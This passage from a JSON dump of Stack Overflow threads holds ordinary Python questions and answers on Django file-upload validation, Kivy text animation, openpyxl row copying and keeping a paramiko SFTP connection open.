that on the parent class(and then just return true anyway)...still says no attribute.  I am not doing a double form instantiation either like the other person you helped."}, {"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "reply_to_user": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1463003176, "post_id": 37172577, "comment_id": 61882295, "body": "the other one on the cleaned_data no attribute is here: <a href=\"http://stackoverflow.com/questions/4308527/django-model-form-object-has-no-attribute-cleaned-data\" title=\"django model form object has no attribute cleaned data\">stackoverflow.com/questions/4308527/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463003712, "post_id": 37173873, "comment_id": 61882504, "body": "that worked, or at least got me farther.  It seems my code  <code>docfile = form.cleaned_data[&#39;docfile&#39;]             newdoc = Document(docfile = docfile)             if newdoc:                 newdoc.save()</code>  fails as I get an error after the files are uploaded and when the view tries to list them that the docfile attribute has no file associated with it (in my template.html) &lt; a href=&quot;{{ doc.docfile.url}}&quot;&gt;  I am guessing because its saving what it shouldn&#39;t be.  So close"}, {"owner": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "reply_to_user": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463004108, "post_id": 37173873, "comment_id": 61882670, "body": "The problem with your saving code is that you are constructing a new Document object without first checking to see if there is a value for the file.  I updated my answer"}, {"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463005102, "post_id": 37173873, "comment_id": 61883059, "body": "updated, and it works!  i did have to change my:                 file = form.cleaned_data[fieldname] from the request.FILES as it still needed the cleaned data.  but now it works with one or more files.  Though if i select no files, it does fail on the same line with a <code>sequence index must be integer, not &#39;str&#39;</code> guessing I need a cast, or something with that for fieldname to know its blank."}, {"owner": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "reply_to_user": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463010038, "post_id": 37173873, "comment_id": 61884561, "body": "Cool that&#39;s great I&#39;ll fix my answer for future searchers.  As far as the other problem I don&#39;t have enough info to fix it..."}, {"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463021745, "post_id": 37173873, "comment_id": 61887417, "body": "yah its a tough one, i am not python-pro enough to figure it out yet.  something about that not liking <code>file = form.cleaned_data[fieldname]</code> when nothing is uploaded."}, {"owner": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "reply_to_user": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "edited": false, "score": 0, "creation_date": 1463022946, "post_id": 37173873, "comment_id": 61887715, "body": "Try <code>file = form.cleaned_data.get(fieldname, None)</code>.. the <code>None</code> is the default if <code>fieldname</code> is not found in cleaned_data, which it will return instead of throwing an exception."}, {"owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "reply_to_user": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "edited": false, "score": 0, "creation_date": 1463062296, "post_id": 37173873, "comment_id": 61911554, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/111773/discussion-between-codejoy-and-little-birdie\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 4349, "user_id": 2945815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7rIjL.jpg?s=128&g=1", "display_name": "little_birdie", "link": "https://stackoverflow.com/users/2945815/little-birdie"}, "is_accepted": true, "score": 1, "last_activity_date": 1463010134, "last_edit_date": 1463010134, "creation_date": 1463003401, "answer_id": 37173873, "question_id": 37172577, "link": "https://stackoverflow.com/questions/37172577/forms-in-django-overriding-validation-on-file-upload-to-make-sure-just-one-valu/37173873#37173873", "title": "forms in django, overriding validation on file upload to make sure just one value is there", "body": "<p>You should set your fields to <code>required=False</code>, which will avoid a validation error if any field is empty:</p>\n\n<pre><code>docfile3 = forms.FileField(\n    label='Select a file',\n    help_text='max. 7 Gigabytes',\n    required=False\n)\n</code></pre>\n\n<p>Then in your form clean method check to see if at least one file is there:</p>\n\n<pre><code>from django.core.exceptions import ValidationError\n\ndef clean(self):\n    data = super(DocumentForm, self).clean()\n\n    # if there are already form errors, don't proceed with additional\n    # validation because it may depend on fields which didn't validate.\n    if self.errors:\n        return data\n\n    if not (data['docfile1'] or data['docfile2'] or data['docfile3']):\n        return ValidationError('You must upload at least one file.')\n\n    return data\n</code></pre>\n\n<p>I have not actually run this code so there may be some little issue but you get the idea...  </p>\n\n<p>In your view form_valid() method, there are problems with your saving code.  Do something more like this:</p>\n\n<pre><code>for fieldname in ('docfile', 'docfile2', 'docfile3'):\n    file = form.cleaned_data.get(fieldname, None)\n    if file:\n        Document(docfile = file).save()\n</code></pre>\n"}], "owner": {"reputation": 3146, "user_id": 327258, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/50d026903563e045ca29cab1ad0b1d66?s=128&d=identicon&r=PG", "display_name": "Codejoy", "link": "https://stackoverflow.com/users/327258/codejoy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 427, "favorite_count": 0, "accepted_answer_id": 37173873, "answer_count": 1, "score": 0, "last_activity_date": 1463010134, "creation_date": 1462998098, "last_edit_date": 1463005084, "question_id": 37172577, "link": "https://stackoverflow.com/questions/37172577/forms-in-django-overriding-validation-on-file-upload-to-make-sure-just-one-valu", "title": "forms in django, overriding validation on file upload to make sure just one value is there", "body": "<p>Edit: Mostly got this working with a clean update</p>\n\n<p>I added docfile2 and docfile3 beyond the example I used to code this.  I also changed the view to handle them:</p>\n\n<pre><code> @login_required(login_url='/ngasite/login/')\ndef list(request):\n    # Handle file upload\n    if request.method == 'POST':\n        form = DocumentForm(request.POST, request.FILES)\n        if form.is_valid():\n            for fieldname in ('docfile', 'docfile2', 'docfile3'):\n                file = form.cleaned_data[fieldname]\n                if file:\n                    Document(docfile=file).save()\n\n\n            # Redirect to the document list after POST\n            return HttpResponseRedirect(reverse('ngasite:list', args=\"\"))\n    else:\n        form = DocumentForm() # A empty, unbound form\n\n    # Load documents for the list page\n    documents = Document.objects.all()\n    paginator = Paginator(documents, 25)\n    page = request.GET.get('page')\n    try:\n        docs = paginator.page(page)\n    except PageNotAnInteger:\n        docs = paginator.page(1)\n    except EmptyPage:\n        docs = paginator.page(paginator.num_pages)\n\n\n    # Render list page with the documents and the form\n    return render_to_response(\n        'ngasite/list.html',\n        {'documents': documents, 'form': form, 'docs':docs},\n        context_instance=RequestContext(request)\n    )\nThis worked pretty well, I can\n</code></pre>\n\n<p>handle three files on my form now instead of one.  But relisting after a post gives me an <code>attribute has no file associated with it</code>  error.  I am guessing because my checks for saving in the view is not really working correctly and saving regardless if there was a file or not.  Maybe my python syntax is bad?\nno errors int he console though.</p>\n\n<p>This is what is failing in my list.html template:</p>\n\n<pre><code>  {% if docs %}\n                                    &lt;ul&gt;\n                                    {% for doc in docs %}\n                                        &lt;li&gt;&lt;a href=\"{{ doc.docfile.url }}\"&gt;{{ doc.docfile.name }} &lt;/a&gt;&lt;/li&gt;\n                                    {% endfor %}\n\n                                    &lt;/ul&gt;\n                                {% else %}\n                                    &lt;p&gt;No documents.&lt;/p&gt;\n                                {% endif %}\n</code></pre>\n\n<p>So my real forms.py with the overriding of the is_valid</p>\n\n<pre><code>    from django import forms\n\n class DocumentForm(forms.Form):\n    docfile = forms.FileField(\n        label='Select a file',\n        help_text='max. 7 Gigabytes',\n        required=False\n    )\n    docfile2 = forms.FileField(\n        label='Select a file',\n        help_text='max. 7 Gigabytes',\n        required=False\n    )\n    docfile3 = forms.FileField(\n        label='Select a file',\n        help_text='max. 7 Gigabytes',\n        required=False\n    )\n    def clean(self):\n        data = super(DocumentForm, self).clean()\n\n        if not (data['docfile'] or data['docfile2'] or data['docfile3']):\n            return ValidationError('You must upload at least one file.')\n\n        return data\n</code></pre>\n\n<p>What am i missing?  my view fails on lines like</p>\n\n<p>docfile=request.FILES['docfile'] cause it knows its missing, I thought my if newdoc2: etc would handle that but it doesnt work like I think it does/should</p>\n\n<p>Ultimately as I learn more python and Django i want to turn this into a nice file uploader with responses to the browser to show the upload progress etc.</p>\n"}, {"tags": ["python", "animation", "kivy", "font-size", "text-size"], "answers": [{"comments": [{"owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1463064052, "post_id": 37174110, "comment_id": 61913075, "body": "If i use <code>scale</code> in a widget which is a child of a <code>BoxLayout</code>, wouldn&#39;t it force other children in that <code>BoxLayout</code>  to change size as well?"}, {"owner": {"reputation": 25731, "user_id": 2469283, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3271ba34d6b680ed1103b4d4aeda9d6d?s=128&d=identicon&r=PG", "display_name": "inclement", "link": "https://stackoverflow.com/users/2469283/inclement"}, "reply_to_user": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 1, "creation_date": 1463064740, "post_id": 37174110, "comment_id": 61913673, "body": "You can use PushMatrix and PopMatrix to constrain where the Scale takes effect."}, {"owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1463141553, "post_id": 37174110, "comment_id": 61950577, "body": "Since links can go bad, I included the code from your link in an answer below. It might be useful to visitors (that is, faster to use) if you include that code in your answer (no attribution required of course; it&#39;s your code after all). If you do, let me know so that I can delete my answer. (I didn&#39;t edit the code into your answer since it would be too substantial of a change)"}], "tags": [], "owner": {"reputation": 25731, "user_id": 2469283, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3271ba34d6b680ed1103b4d4aeda9d6d?s=128&d=identicon&r=PG", "display_name": "inclement", "link": "https://stackoverflow.com/users/2469283/inclement"}, "is_accepted": true, "score": 2, "last_activity_date": 1463004629, "creation_date": 1463004629, "answer_id": 37174110, "question_id": 37172529, "link": "https://stackoverflow.com/questions/37172529/how-to-animate-font-size-without-text-reordering-when-text-size-self-size/37174110#37174110", "title": "How to animate font size without text reordering, when `text_size=self.size`", "body": "<p>You could animate a stretching of the text instead of its font size. This would be slightly less graphically precise (like enlarging a small image looks blurry), but might be good enough depending on your parameters. It would also be <em>much</em> more performant; animating the font size requires re-rendering the texture each time.</p>\n\n<p>I have a very simple example of using a Scale instruction for this, which you can find <a href=\"https://github.com/inclement/kivy-finger-chooser/blob/master/player_chooser/playerchooser.kv#L37\" rel=\"nofollow\">here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "is_accepted": false, "score": 0, "last_activity_date": 1463141403, "last_edit_date": 1495540790, "creation_date": 1463141403, "answer_id": 37209731, "question_id": 37172529, "link": "https://stackoverflow.com/questions/37172529/how-to-animate-font-size-without-text-reordering-when-text-size-self-size/37209731#37209731", "title": "How to animate font size without text reordering, when `text_size=self.size`", "body": "<p>Using the code suggested by <a href=\"https://stackoverflow.com/users/2469283/inclement\">inclement</a> I end up with the following code which behaves as described in <a href=\"https://stackoverflow.com/a/37174110/4230591\">his answer</a>:</p>\n\n<pre><code>from kivy.app import App\nfrom kivy.uix.button import Button\nfrom kivy.animation import Animation\nfrom kivy.lang import Builder\nfrom kivy.properties import NumericProperty\n\n\nkv = \"\"\"\n&lt;MyWidget&gt;:\n    text: 'long text...' * 5\n    text_size: self.size\n    halign: 'center'\n    valign: 'middle'\n    on_release: self.animate_function()\n\n    canvas.before:\n        PushMatrix:\n        Scale:\n            origin: self.x + 0.5*self.width, self.y + 0.5*self.height\n            x: self.scale\n            y: self.scale\n\n    canvas.after:\n        PopMatrix:\n\"\"\"\n\n\nBuilder.load_string(kv)\n\n\nclass MyWidget(Button):\n    scale = NumericProperty(1)\n\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        self.initial_scale = self.scale\n\n    def animate_function(self):\n\n        anim = Animation(scale=self.initial_scale * 1.2, duration=.1)\n        anim += Animation(scale=self.initial_scale, duration=.1)\n        anim.start(self)\n\n\nclass MyButtonsApp(App):\n    def build(self):\n        return MyWidget()\n\n\nif __name__ == '__main__':\n    MyButtonsApp().run()\n</code></pre>\n"}], "owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 383, "favorite_count": 0, "accepted_answer_id": 37174110, "answer_count": 2, "score": 0, "last_activity_date": 1463141403, "creation_date": 1462997946, "question_id": 37172529, "link": "https://stackoverflow.com/questions/37172529/how-to-animate-font-size-without-text-reordering-when-text-size-self-size", "title": "How to animate font size without text reordering, when `text_size=self.size`", "body": "<p>I need to display some text and later on animate its font size. The text must not exceed the size of its widget so I use <code>text_size: self.size</code> (I don't mind the text exceeding its widget size during animation though)</p>\n\n<p><a href=\"https://i.stack.imgur.com/mqX0V.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/mqX0V.png\" alt=\"enter image description here\"></a></p>\n\n<p>The problem is that animation of the font size forces the text to reorder, which is ugly (red circle in image got there during animation) </p>\n\n<p><a href=\"https://i.stack.imgur.com/ScAju.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ScAju.png\" alt=\"enter image description here\"></a></p>\n\n<p>I would prefer it <em>did</em> exceed temporarily that size, instead. </p>\n\n<p>How can I achieve both the text not exceeding its widget's size, and during font-size animation to exceed that size (shown in image below)?</p>\n\n<p><a href=\"https://i.stack.imgur.com/B24OW.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/B24OW.png\" alt=\"enter image description here\"></a></p>\n\n<hr>\n\n<p>Code used: </p>\n\n<pre><code>from kivy.app import App\nfrom kivy.uix.button import Button\nfrom kivy.animation import Animation\nfrom kivy.lang import Builder\n\n\nkv = \"\"\"\n&lt;MyWidget&gt;:\n    text: 'long text...' * 5\n    text_size: self.size\n    halign: 'center'\n    valign: 'middle'\n    on_release: self.animate_function()\n\"\"\"\n\n\nBuilder.load_string(kv)\n\n\nclass MyWidget(Button):\n\n    def animate_function(self):\n        initial_font_size = self.font_size\n        anim = Animation(font_size=initial_font_size * 1.5, duration=2)\n        anim += Animation(font_size=initial_font_size, duration=2)\n        anim.start(self)\n\n\nclass MyButtonsApp(App):\n    def build(self):\n        return MyWidget()\n\n\nif __name__ == '__main__':\n    MyButtonsApp().run()\n</code></pre>\n"}, {"tags": ["python", "excel", "python-3.x", "openpyxl"], "answers": [{"tags": [], "owner": {"reputation": 14362, "user_id": 2385133, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3a93c5a0f975385738c1f27848f3b50a?s=128&d=identicon&r=PG", "display_name": "Charlie Clark", "link": "https://stackoverflow.com/users/2385133/charlie-clark"}, "is_accepted": false, "score": 0, "last_activity_date": 1463043096, "creation_date": 1463043096, "answer_id": 37181862, "question_id": 37172522, "link": "https://stackoverflow.com/questions/37172522/how-to-import-the-last-row-from-array-of-excel-files-to-another-excel-using-open/37181862#37181862", "title": "How to import the last row from array of excel files to another excel using openpyxl", "body": "<p>The function <code>get_range()</code> will overwrite the existing rows.</p>\n\n<p>You should be able to use <code>ws.rows[-1]</code> to get the last row from any sheet. Something like</p>\n\n<pre><code>for f in file_array_receiver:\n    sheet = f.active\n    prize_sheet.append(f.rows[-1][:3])\n</code></pre>\n\n<p>Might be what you're looking for.</p>\n"}], "owner": {"reputation": 1838, "user_id": 3911211, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/e52cbd601f7dbdd92ad34904e7560a9a?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Chepenko", "link": "https://stackoverflow.com/users/3911211/daniel-chepenko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 404, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463043096, "creation_date": 1462997916, "question_id": 37172522, "link": "https://stackoverflow.com/questions/37172522/how-to-import-the-last-row-from-array-of-excel-files-to-another-excel-using-open", "title": "How to import the last row from array of excel files to another excel using openpyxl", "body": "<p>I have a list of excel files with similar last row. It contains private information about client (his name, surname, phone). Each excel file correspond to each client. I need to make one excel file with all data about every client.\nI decide to do it automatically, so looked to openpyxl library.\nI wrote such code, but it doesn't work correctly.</p>\n\n<p>In my test directory I have three files. </p>\n\n<pre><code>import openpyxl\nimport os\nimport glob\nfrom openpyxl import load_workbook\nfrom openpyxl import Workbook\nimport openpyxl.styles\nfrom openpyxl.cell import get_column_letter\n\ndef get_range(file, new_file):\n\n    prize_sheet = prize_info.active\n    sheet = f.active\n    for row_num in range (1, len(file_array_reciever)):\n        for col_num in range (3,sheet.max_column):\n            prize_sheet.cell(row = row_num, column = col_num).value = sheet.cell(row = sheet.max_row, column = col_num).value\n\n    return prize_info.save(\"Ex.xlsx\")\n\n\n\n#path to test files\npath_kit = 'prize_input/kit'\n\n#creating single document\nprize_info = Workbook()\n\nfile_array_reciever = []\n\nfor file in glob.glob(os.path.join(path_kit, '*.xlsx')):\n    file_array_reciever.append(file)\n\n\nfor file in glob.glob(os.path.join(path_kit, '*.xlsx')):\n    file_array_reciever.append(file)\n    f = load_workbook(filename = file)\n    get_range(f,prize_info)\n</code></pre>\n\n<p>I think I have problem in my loop, because in output file I get three identical rows from first excel file</p>\n"}, {"tags": ["python", "ssh", "sftp", "paramiko"], "comments": [{"owner": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "edited": false, "score": 0, "creation_date": 1462998964, "post_id": 37172488, "comment_id": 61880229, "body": "If you suspect GC is the culprit, try returning <code>ssh, sftp</code> and see if that keeps it alive."}], "answers": [{"comments": [{"owner": {"reputation": 17081, "user_id": 702948, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/67e6e5d7a11beaccbb17bd47142b42de?s=128&d=identicon&r=PG", "display_name": "ewok", "link": "https://stackoverflow.com/users/702948/ewok"}, "edited": false, "score": 0, "creation_date": 1462999192, "post_id": 37172830, "comment_id": 61880351, "body": "can this be accomplished without actually returning two values?"}, {"owner": {"reputation": 1439, "user_id": 3453271, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1018800061/picture?type=large", "display_name": "Craneum", "link": "https://stackoverflow.com/users/3453271/craneum"}, "reply_to_user": {"reputation": 17081, "user_id": 702948, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/67e6e5d7a11beaccbb17bd47142b42de?s=128&d=identicon&r=PG", "display_name": "ewok", "link": "https://stackoverflow.com/users/702948/ewok"}, "edited": false, "score": 0, "creation_date": 1462999791, "post_id": 37172830, "comment_id": 61880655, "body": "yes but you would have to open the sftp connection outside of the function...  ssh = open_sftp_connection(ip, user, passwd) sftp = ssh.open_sftp()"}, {"owner": {"reputation": 17081, "user_id": 702948, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/67e6e5d7a11beaccbb17bd47142b42de?s=128&d=identicon&r=PG", "display_name": "ewok", "link": "https://stackoverflow.com/users/702948/ewok"}, "edited": false, "score": 0, "creation_date": 1462999840, "post_id": 37172830, "comment_id": 61880686, "body": "so the requirement of a single function that takes an ip, user, and password and returns only an open sftp connection is impossible?"}, {"owner": {"reputation": 1439, "user_id": 3453271, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1018800061/picture?type=large", "display_name": "Craneum", "link": "https://stackoverflow.com/users/3453271/craneum"}, "reply_to_user": {"reputation": 17081, "user_id": 702948, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/67e6e5d7a11beaccbb17bd47142b42de?s=128&d=identicon&r=PG", "display_name": "ewok", "link": "https://stackoverflow.com/users/702948/ewok"}, "edited": false, "score": 1, "creation_date": 1462999964, "post_id": 37172830, "comment_id": 61880747, "body": "from what I can tell, yes."}], "tags": [], "owner": {"reputation": 1439, "user_id": 3453271, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1018800061/picture?type=large", "display_name": "Craneum", "link": "https://stackoverflow.com/users/3453271/craneum"}, "is_accepted": false, "score": 2, "last_activity_date": 1462999103, "creation_date": 1462999103, "answer_id": 37172830, "question_id": 37172488, "link": "https://stackoverflow.com/questions/37172488/paramiko-method-to-open-and-return-an-sftp-conneciton/37172830#37172830", "title": "paramiko: method to open and return an sftp conneciton", "body": "<p>You need access to both the ssh and sftp instances.</p>\n\n<pre><code>def open_sftp_connection(ip, user, passwd):\n    ssh = SSHClient()\n    ssh.load_system_host_keys()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    ssh.connect(ip, 22, user, passwd)\n    assert ssh.get_transport().is_active(), 'Failed to connect to server'\n    return ssh, ssh.open_sftp()\n\nssh, sftp = open_sftp_connection(ip, user, passwd)\nprint sftp.get_channel().get_transport().is_active()\n</code></pre>\n"}], "owner": {"reputation": 17081, "user_id": 702948, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/67e6e5d7a11beaccbb17bd47142b42de?s=128&d=identicon&r=PG", "display_name": "ewok", "link": "https://stackoverflow.com/users/702948/ewok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1200, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1462999103, "creation_date": 1462997789, "last_edit_date": 1462999099, "question_id": 37172488, "link": "https://stackoverflow.com/questions/37172488/paramiko-method-to-open-and-return-an-sftp-conneciton", "title": "paramiko: method to open and return an sftp conneciton", "body": "<p>I want to write a method that takes an IP, username, and password, and returns an open SFTP connection to that server.  Here's the code I have, using <code>paramiko</code>:</p>\n\n<pre><code>def open_sftp_connection(ip, user, passwd):\n    ssh = SSHClient()\n    ssh.load_system_host_keys()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    ssh.connect(ip, 22, user, passwd)\n    assert ssh.get_transport().is_active(), 'Failed to connect to server'\n\n    sftp = ssh.open_sftp()\n    return sftp\n</code></pre>\n\n<p>If I execute this code directly in a python shell, it works fine:</p>\n\n<pre><code>&gt;&gt;&gt; ssh = SSHClient()\n&gt;&gt;&gt; ssh.load_system_host_keys()\n&gt;&gt;&gt; ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n&gt;&gt;&gt; ssh.connect(ip, 22, user, passwd)\n&gt;&gt;&gt; assert ssh.get_transport().is_active(), 'Failed to connect to server'\n&gt;&gt;&gt; sftp = ssh.open_sftp()\n&gt;&gt;&gt; print sftp.get_channel().get_transport().is_active()\nTrue\n</code></pre>\n\n<p>But when I put it in a function and call the function, the sftp connection comes back disconnected: </p>\n\n<pre><code>&gt;&gt;&gt; def open_sftp_connection(ip, user, passwd):\n...     ssh = SSHClient()\n...     ssh.load_system_host_keys()\n...     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n...     ssh.connect(ip, 22, user, passwd)\n...     assert ssh.get_transport().is_active(), 'Failed to connect to server'\n...     sftp = ssh.open_sftp()\n...     return sftp\n...\n&gt;&gt;&gt; sftp = open_sftp_connection(ip, user, passwd)\n&gt;&gt;&gt; print sftp.get_channel().get_transport().is_active()\nFalse\n</code></pre>\n\n<p>The only thing I can think of is the ssh connection is stored locally in <code>ssh</code>, then when the function returns, <code>ssh</code> is garbage collected, and the connection is terminated, so while the <code>SFTPClient</code> still exists, the underlying connection is now dead.</p>\n\n<p>If that's the case, how can I resolve it?  If not, what is actually happening?</p>\n\n<p><strong>EDIT</strong>: I modified the function to return <code>sftp, ssh</code> and now the connection stays open.  So it is the garbage collector that's the culprit.  Can this be resolved without returning two values?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 8363, "user_id": 706421, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/bb7e85832e0110214043a8726ad70a76?s=128&d=identicon&r=PG", "display_name": "Dustin Oprea", "link": "https://stackoverflow.com/users/706421/dustin-oprea"}, "edited": false, "score": 0, "creation_date": 1462997960, "post_id": 37172464, "comment_id": 61879673, "body": "In general, things that aren&#39;t changed are optimized to only be initialized once in most languages unless you direct the compiler to do otherwise (where you are able to)."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462998092, "post_id": 37172464, "comment_id": 61879756, "body": "In Python, in general, nothing is ever optimized by the interpreter ;-)"}, {"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "edited": false, "score": 0, "creation_date": 1462999144, "post_id": 37172464, "comment_id": 61880326, "body": "<a href=\"http://stackoverflow.com/questions/12590058/python-performance-with-global-variables-vs-local\" title=\"python performance with global variables vs local\">stackoverflow.com/questions/12590058/&hellip;</a> gives you some answers"}], "answers": [{"comments": [{"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1462997836, "post_id": 37172495, "comment_id": 61879599, "body": "I really hope you plan on expanding this answer."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": 